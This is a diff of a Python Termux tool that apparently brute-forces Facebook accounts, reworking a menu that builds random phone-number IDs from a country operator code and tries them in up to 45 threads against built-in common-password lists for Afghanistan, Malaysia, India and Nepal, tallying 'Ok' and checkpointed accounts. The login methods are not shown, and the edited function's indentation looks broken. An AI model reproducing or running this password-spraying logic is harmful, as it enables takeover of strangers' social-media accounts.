@@ -27,7 +27,7 @@ os.system('clear')
 print("\033[38;5;46m [/] Installing Requirements.....\033[0m")
 
 logo = """
-███████╗ █████╗ █████╗░░░██████╗  ██████╗░░░██████╗░░░░░░░░░░██╗███╗░░██╗░█████╗░░░░░  
+ ███████╗ █████╗ █████╗░░░██████╗  ██████╗░░░██████╗░░░░░░░░░░██╗███╗░░██╗░█████╗░░░░░  
  ██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔═══██╗ ██╔═══██╗░░░░░░░░░██║████╗░██║██╔══██╗░░░░ 
  █████╗░ ███████║██████╔╝██║░░░██║██║░░░██║ ██║░░░██║░██████╗░██║██╔██╗██║██║░░╚═╝░░░░ 
  ██╔══╝░ ██╔══██║██╔══██╗██║░░░██║██║░░░██║ ██║▄▄░██║░╚═════╝░██║██║╚████║██║░░██╗░░░░  
@@ -87,11 +87,11 @@ def print_centered_big(text):
 def print_box1():
     width = get_terminal_width()
     line_width = min(width - 4, 70)
-    print(f"{LINE_BOLD}{DARK_GOLD}═══════════════════════ {GOLD_LINE}» ───── «◊•» ✠ • ◊ «─────» «═══════════════════{RESET}")
+    print(f"{LINE_BOLD}{DARK_GOLD}═══════════════════════ {GOLD_LINE}» ───── «◊•» ✠ • ◊ «─────» «═════════════════{RESET}")
     info_lines = [
         f"  {GOLD_LINE}Developer   >>{WHITE_TEXT} Faroooq Inc",
         f"  {GOLD_LINE}Tool Type   >>{WHITE_TEXT} FILExRANDOM",
-        f"  {GOLD_LINE}Github      >>{WHITE_TEXT} github.com/king-afghan",
+        f"  {GOLD_LINE}Github      >>{WHITE_TEXT} github.com/faroooq-inc",
         f"  {GOLD_LINE}Version     >>{WHITE_TEXT} V2.7",
         f"  {GOLD_LINE}Status      >>{WHITE_TEXT} Active",
         f"  {GOLD_LINE}Platform    >>{WHITE_TEXT} Termux"
@@ -111,10 +111,10 @@ def print_box1():
         if padding_needed < 0:
             padding_needed = 0
         print(f"{bg_color}{WHITE_TEXT}{BOLD}║{info}{' ' * padding_needed} ║{RESET}")
-    print(f"{LINE_BOLD}{DARK_GOLD}═══════════════ ──•◆•── ────────────────•✦•───────────────────╝{RESET}")
+    print(f"{LINE_BOLD}{DARK_GOLD}═══════════════ ──•◆•── ────────────────•✦•───────────────────────╝{RESET}")
 
 def show_prompt():
-    print(f"\n\033[93m{BOLD}┌─[h4ck3r@termux]-[~]\033[0m")
+    print(f"\n\033[93m{BOLD}┌─[faroooq@termux]-[~]\033[0m")
     print(f"{BOLD}{CYAN_ARROW}└──╼{RESET} {BOLD}{CYAN_ARROW}❯{RESET}{BOLD}{CYAN_ARROW}❯{RESET}{BOLD}{CYAN_ARROW}❯{RESET} \033[0m", end="")
 
 def welcome():
@@ -683,101 +683,154 @@ class RANDOM:
             pass
 #━━━━━━━━━━━━〔━>><> RANDOM >><<CLASS <><<━〕━━━━━━━━━━━━#
     def rnd(self):
-        self.clear()
-        print(f" [1] Random Afghanistan \n [2] Random Malaysia \n [3] Random India \n [4] Random Nepal")
-        self.linex()
-        country = input(f" {X} Select > ")
-        self.clear()
+    self.clear()
+    
+    # د هیواد انتخاب
+    print(f"{GOLD_LINE}{BOLD}{'◇' * 50}{RESET}")
+    print(f"{GOLD_LINE}{BOLD}◆{RESET} 1 → Random Afghanistan{ ' ' * 25}{GOLD_LINE}{BOLD}◆{RESET}")
+    print(f"{GOLD_LINE}{BOLD}◆{RESET} 2 → Random Malaysia{ ' ' * 28}{GOLD_LINE}{BOLD}◆{RESET}")
+    print(f"{GOLD_LINE}{BOLD}◆{RESET} 3 → Random India{ ' ' * 31}{GOLD_LINE}{BOLD}◆{RESET}")
+    print(f"{GOLD_LINE}{BOLD}◆{RESET} 4 → Random Nepal{ ' ' * 31}{GOLD_LINE}{BOLD}◆{RESET}")
+    print(f"{GOLD_LINE}{BOLD}{'◇' * 50}{RESET}")
+    
+    country = input(f" {X} Select > ")
+    self.clear()
+    
+    # د هیواد پر بنسټ مثال
+    if country == "1":
+        ex_info = "Ex > 9378, 9371, 9377*"
+        country_name = "Afghanistan"
+    elif country == "2":
+        ex_info = "Ex > 0118, 012*, 011*"
+        country_name = "Malaysia"
+    elif country == "3":
+        ex_info = "Ex > 9848, 98**, 63**"
+        country_name = "India"
+    elif country == "4":
+        ex_info = "Ex > 9814, 99**, 98**"
+        country_name = "Nepal"
+    else:
+        print(f" {X} Select Correct Country :)")
+        time.sleep(2)
+        self.rnd()
+        return
+    
+    # د کوډ لپاره بکس
+    print(f"{GOLD_LINE}{BOLD}{'◇' * 50}{RESET}")
+    print(f"{GOLD_LINE}{BOLD}◆{RESET} {ex_info}{' ' * (37 - len(ex_info))}{GOLD_LINE}{BOLD}◆{RESET}")
+    print(f"{GOLD_LINE}{BOLD}{'◇' * 50}{RESET}")
+    code = input(f" {X} Put Code > ")
+    
+    # د حد لپاره بکس
+    print(f"{GOLD_LINE}{BOLD}{'◇' * 50}{RESET}")
+    print(f"{GOLD_LINE}{BOLD}◆{RESET} Ex > 1000, 9999{ ' ' * 31}{GOLD_LINE}{BOLD}◆{RESET}")
+    print(f"{GOLD_LINE}{BOLD}{'◇' * 50}{RESET}")
+    
+    try:
+        limit = int(input(f" {X} Put Limit > "))
+    except:
+        limit = 99999
+    
+    for nmbr in range(limit):
+        nmp = ''.join(random.choice(string.digits) for _ in range(7))
+        self.user.append(nmp)
+    
+    # د پاسورډ ډول لپاره بکس
+    print(f"{GOLD_LINE}{BOLD}{'◇' * 50}{RESET}")
+    print(f"{GOLD_LINE}{BOLD}◆{RESET} 1 → Auto Password{ ' ' * 30}{GOLD_LINE}{BOLD}◆{RESET}")
+    print(f"{GOLD_LINE}{BOLD}◆{RESET} 2 → Manual Password{ ' ' * 29}{GOLD_LINE}{BOLD}◆{RESET}")
+    print(f"{GOLD_LINE}{BOLD}{'◇' * 50}{RESET}")
+    pstype = input(f" {X} Select > ")
+    
+    if pstype == "1":
         if country == "1":
-            print(f" {X} Ex > 9378, 9371, 9377*")
+            for pasx in ["100200","10002000","500600","500500","700800","50006000","200300","۱۲۳۴۵۶","۱۲۳۴۵۶۷۸۹","afghanistan","afghan123","afghan12345","Khan786","khan123","khan1234","khan12345"]:
+                self.plist.append(pasx)
         elif country == "2":
-            print(f" {X} Ex > 0118, 012*, 011*")
+            for pasx in ["first6","first7","first8","last11","last6","last7","last8","Malaysia","malaysia"]:
+                self.plist.append(pasx)
         elif country == "3":
-            print(f" {X} Ex > 9848,98**, 63**")
+            for pasx in ["first10","first6","first8","first7","last6","last8","57273200","59039200","57575711"]:
+                self.plist.append(pasx)
         elif country == "4":
-            print(f" {X} Ex > 9814, 99**, 98**")
-        else:
-            print(f" {X} Select Correct Country :)");time.sleep(2)
-        self.linex()
-        code = input(f" {X} Put Code > ")
-        self.linex()
-        print(f" {X} Ex > 1000,9999")
-        self.linex()
-        try:limit = int(input(f" {X} Put Limit > "))
-        except:limit = 99999
-        for nmbr in range(limit):
-            nmp = ''.join(random.choice(string.digits) for _ in range(7))
-            self.user.append(nmp)
-        self.linex()
-        print(f" [1] Auto Password \n [2] Manual Password")
-        self.linex()
-        pstype = input(f" {X} Select > ")
-        if pstype == "1":
-            if country == "1":
-                for pasx in ["100200","10002000","500600","500500","700800","50006000","200300","۱۲۳۴۵۶","۱۲۳۴۵۶۷۸۹","afghanistan","afghan123","afghan12345","afghan12345","Khan786","khan123","khan1234","khan12345"]:
-                    self.plist.append(pasx)
-                self.linex()
-            elif country == "2":
-                for pasx in ["first6","first7","first8","last11","last6","last7","last8","Malaysia","malaysia"]:
-                    self.plist.append(pasx)
-                self.linex()
-            elif country == "3":
-                for pasx in ["first10","first6","first8","first7","last6","last8","57273200","59039200","57575711"]:
-                    self.plist.append(pasx)
-                self.linex()
-            elif country == "4":
-                for pasx in ['last7','last6','last8','first10','nepal123','maya123','nepal1234','tamang','magar123','nepal12345','magar1234','magar12345','nepali','tamang123','kathmandu','pokhara','kathmandu123','pokhara123','dinesh','gurung123','sagar123','Kathmandu1234']:
-                    self.plist.append(pasx)
-                self.linex()
-        else:
-            self.linex()
-            try:pslimit = int(input(f" {X} Password Limit? > "))
-            except:pslimit = 8
-            self.linex()
-            print(f" {X} Ex > first6,last6,first7,etc...")
-            self.linex()
-            for x in range(pslimit):
-                pwx = input(f" {X} Password [{x+1}] > ")
-                self.plist.append(pwx)
+            for pasx in ['last7','last6','last8','first10','nepal123','maya123','nepal1234','tamang','magar123','nepal12345','magar1234','magar12345','nepali','tamang123','kathmandu','pokhara','kathmandu123','pokhara123','dinesh','gurung123','sagar123','Kathmandu1234']:
+                self.plist.append(pasx)
+    else:
+        try:
+            pslimit = int(input(f" {X} Password Limit? > "))
+        except:
+            pslimit = 8
+        print(f" {X} Ex > first6, last6, first7, etc...")
+        for x in range(pslimit):
+            pwx = input(f" {X} Password [{x+1}] > ")
+            self.plist.append(pwx)
+    
+    # د میتود لپاره بکس
+    self.clear()
+    print(f"{GOLD_LINE}{BOLD}{'◇' * 50}{RESET}")
+    print(f"{GOLD_LINE}{BOLD}◆{RESET} 1 → Method [c_user]{ ' ' * 27}{GOLD_LINE}{BOLD}◆{RESET}")
+    print(f"{GOLD_LINE}{BOLD}◆{RESET} 2 → Method [c_user]{ ' ' * 27}{GOLD_LINE}{BOLD}◆{RESET}")
+    print(f"{GOLD_LINE}{BOLD}◆{RESET} 3 → Method [c_user]{ ' ' * 27}{GOLD_LINE}{BOLD}◆{RESET}")
+    print(f"{GOLD_LINE}{BOLD}◆{RESET} 4 → Method [datr]{ ' ' * 29}{GOLD_LINE}{BOLD}◆{RESET}")
+    print(f"{GOLD_LINE}{BOLD}◆{RESET} 5 → Method [c_user]{ ' ' * 27}{GOLD_LINE}{BOLD}◆{RESET}")
+    print(f"{GOLD_LINE}{BOLD}{'◇' * 50}{RESET}")
+    mtd = input(f" {X} Select > ")
+    
+    # د سرعت لپاره بکس
+    print(f"{GOLD_LINE}{BOLD}{'◇' * 50}{RESET}")
+    print(f"{GOLD_LINE}{BOLD}◆{RESET} 1 → Speed [Normal]{ ' ' * 29}{GOLD_LINE}{BOLD}◆{RESET}")
+    print(f"{GOLD_LINE}{BOLD}◆{RESET} 2 → Speed [High]{ ' ' * 31}{GOLD_LINE}{BOLD}◆{RESET}")
+    print(f"{GOLD_LINE}{BOLD}{'◇' * 50}{RESET}")
+    spd = input(f" {X} Select > ")
+    
+    if spd == "1":
+        speed = 30
+    else:
+        speed = 45
+    
+    # د کوکی لپاره بکس
+    print(f"{GOLD_LINE}{BOLD}{'◇' * 50}{RESET}")
+    print(f"{GOLD_LINE}{BOLD}◆{RESET} Show Cookie? (Y/N){ ' ' * 31}{GOLD_LINE}{BOLD}◆{RESET}")
+    print(f"{GOLD_LINE}{BOLD}{'◇' * 50}{RESET}")
+    cki = input(f" {X} Select (Y|N) > ")
+    
+    if cki in ["n", "N", "no", "NO"]:
+        self.cok.append("no")
+    else:
+        self.cok.append("yes")
+    
+    # د کرک کولو پیل
+    with ThreadPoolExecutor(max_workers=speed) as executor:
         self.clear()
-        print(f" [1] Method [c_user] \n [2] Method [c_user] \n [3] Method [c_user] \n [4] Method [datr] \n [5] Method [c_user]")
+        print(f"{GOLD_LINE}{BOLD}{'◇' * 50}{RESET}")
+        print(f"{GOLD_LINE}{BOLD}◆{RESET} Operator > {code}{' ' * (36 - len(str(code)))}{GOLD_LINE}{BOLD}◆{RESET}")
+        print(f"{GOLD_LINE}{BOLD}◆{RESET} Total Account > {G}{limit}{RESET}{' ' * (33 - len(str(limit)))}{GOLD_LINE}{BOLD}◆{RESET}")
+        print(f"{GOLD_LINE}{BOLD}◆{RESET} Use Airplane (Flight) Mode For Speed Up{ ' ' * 5}{GOLD_LINE}{BOLD}◆{RESET}")
+        print(f"{GOLD_LINE}{BOLD}{'◇' * 50}{RESET}")
         self.linex()
-        mtd = input(f" {X} Select > ")
-        self.linex()
-        print(f" [1] Cracking Speed [Normal] \n [2] Cracking Speed [High]")
-        self.linex()
-        spd = input(f" {X} Select > ")
-        if spd == "1":speed = 30
-        else:speed = 45
-        self.linex()
-        print(f" {X} Do You Want to Show Cookie ?)")
-        self.linex()
-        cki = input(f" {X} Select (Y|N) > ")
-        if cki in ["n","N","no","NO"]:self.cok.append("no")
-        else:self.cok.append("yes")
-        with ThreadPoolExecutor(max_workers=speed) as executor:
-            self.clear()
-            print(f" {X} Operator  > {code} \n {X} Total Account > {G}{limit}\n {X} Use Airplane ({R}Flight{W}) Mode For Speed Up")
-            self.linex()
-            for love in self.user:
-                ids = code+love
-                if mtd == "1":
-                    executor.submit(self.rA, ids)
-                elif mtd == "2":
-                    executor.submit(self.rB, ids)
-                elif mtd == "4":
-                    executor.submit(self.rD, ids)
-                elif mtd == "5":
-                    executor.submit(self.rE, ids)
-                else:
-                    executor.submit(self.rC, ids)
-        print("")
-        self.linex()
-        print(f" {X} Total Ok Account >{G} {len(self.oks)}\n {X} Total Cp Account >{R} {len(self.cps)}")
-        self.linex()
-        print(f" {X} The Process Has Completed \n {X} Thanks For Using My Tools")
-        self.linex()
-        sys.exit()
+        
+        for love in self.user:
+            ids = code + love
+            if mtd == "1":
+                executor.submit(self.rA, ids)
+            elif mtd == "2":
+                executor.submit(self.rB, ids)
+            elif mtd == "4":
+                executor.submit(self.rD, ids)
+            elif mtd == "5":
+                executor.submit(self.rE, ids)
+            else:
+                executor.submit(self.rC, ids)
+    
+    print("")
+    self.linex()
+    print(f" {X} Total Ok Account > {G}{len(self.oks)}{RESET}")
+    print(f" {X} Total Cp Account > {R}{len(self.cps)}{RESET}")
+    self.linex()
+    print(f" {X} The Process Has Completed")
+    print(f" {X} Thanks For Using My Tools")
+    self.linex()
+    sys.exit()
 
     def pwmanager(self,num,type):
         if 'first' in type:
